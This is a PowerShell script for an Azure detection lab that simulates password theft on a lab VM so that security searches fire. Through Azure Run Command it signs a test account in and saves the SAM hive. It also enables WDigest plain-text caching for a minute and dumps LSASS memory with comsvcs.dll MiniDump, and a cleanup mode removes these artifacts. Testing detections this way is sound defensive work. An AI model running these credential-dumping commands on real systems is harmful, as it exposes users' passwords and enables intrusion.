param(
    [string]$ResourceGroup = 'rg-uc3-lab',
    [string]$MainVm = 'opca-wks-01',
    [switch]$Cleanup
)
# LAB VMs ONLY. Attack Detection lab test 2, "Password theft from memory". Run in Azure PowerShell (Cloud Shell),
# signed in to the subscription that holds the lab VMs. It runs inside the VM through Azure Run Command (as SYSTEM).
#
#   ./Test-02-PasswordTheft.ps1           test account finance.user signs in (a scheduled task), so its password
#                                         is in memory; local password store saved; WDigest on for 1 minute, then off;
#                                         LSASS memory copied with comsvcs.dll (Defender will probably block it).
#                                         Searches 1, 2, 4, 5 and 8 should hit.
#   ./Test-02-PasswordTheft.ps1 -Cleanup  removes the dump files, the task and the test account.

$ErrorActionPreference = 'Stop'

function Invoke-OnVm([string]$Vm, [string]$Script) {
    $file = Join-Path ([IO.Path]::GetTempPath()) "attacklab-$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -Path $file -Value $Script -Encoding UTF8
    try {
        Write-Host "Running on $Vm through Azure Run Command (a minute or two)..." -ForegroundColor Cyan
        $result = Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroup -VMName $Vm -CommandId RunPowerShellScript -ScriptPath $file
        foreach ($v in $result.Value) { if ($v.Message) { Write-Host $v.Message } }
    } finally { Remove-Item $file -ErrorAction SilentlyContinue }
}

function New-LabPassword { (-join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ })) + '-7a!' }

$test = @'
$ErrorActionPreference = 'Continue'
$pw = '__PASSWORD__'
$secure = ConvertTo-SecureString $pw -AsPlainText -Force
if (Get-LocalUser finance.user -ErrorAction SilentlyContinue) { Set-LocalUser finance.user -Password $secure }
else { New-LocalUser finance.user -Password $secure -Description 'Lab test account' | Out-Null }
# Performance Log Users may sign in as a batch job, which is how the task below signs finance.user in
Add-LocalGroupMember -SID 'S-1-5-32-559' -Member finance.user -ErrorAction SilentlyContinue
$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c ping -n 180 127.0.0.1 >nul'
Register-ScheduledTask SysHealthLogon -Action $action -User finance.user -Password $pw -Force | Out-Null
Start-ScheduledTask SysHealthLogon
Start-Sleep 15
Write-Output '[done] finance.user signed in (its password is now in LSASS memory)'

& reg.exe save HKLM\SAM C:\Windows\Temp\sam.save /y 2>&1 | Out-Null
Write-Output '[done] local password store (SAM) saved to C:\Windows\Temp\sam.save'

$wd = 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'
& reg.exe add $wd /v UseLogonCredential /t REG_DWORD /d 1 /f | Out-Null
Start-Sleep 60
& reg.exe add $wd /v UseLogonCredential /t REG_DWORD /d 0 /f | Out-Null
Write-Output '[done] WDigest plain-text passwords switched on for 1 minute, then off'

# last, because Defender is expected to stop it
$lsass = (Get-Process lsass).Id
$p = Start-Process rundll32.exe -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $lsass C:\Windows\Temp\lsass.dmp full" -PassThru -WindowStyle Hidden
$p | Wait-Process -Timeout 60 -ErrorAction SilentlyContinue
Write-Output "[done] LSASS memory copy attempted (dump file there: $(Test-Path C:\Windows\Temp\lsass.dmp); Defender usually blocks it)"
'@

$cleanup = @'
$ErrorActionPreference = 'Continue'
Remove-Item C:\Windows\Temp\lsass.dmp, C:\Windows\Temp\sam.save -Force -ErrorAction SilentlyContinue
Unregister-ScheduledTask SysHealthLogon -Confirm:$false -ErrorAction SilentlyContinue
Remove-LocalUser finance.user -ErrorAction SilentlyContinue
Write-Output '[done] dump files, task SysHealthLogon and account finance.user removed'
'@

if ($Cleanup) { Invoke-OnVm $MainVm $cleanup; return }
Invoke-OnVm $MainVm $test.Replace('__PASSWORD__', (New-LabPassword))
Write-Host "`nWait 15-60 minutes, then run the Attack Detection Agent: one password-theft story on $MainVm."
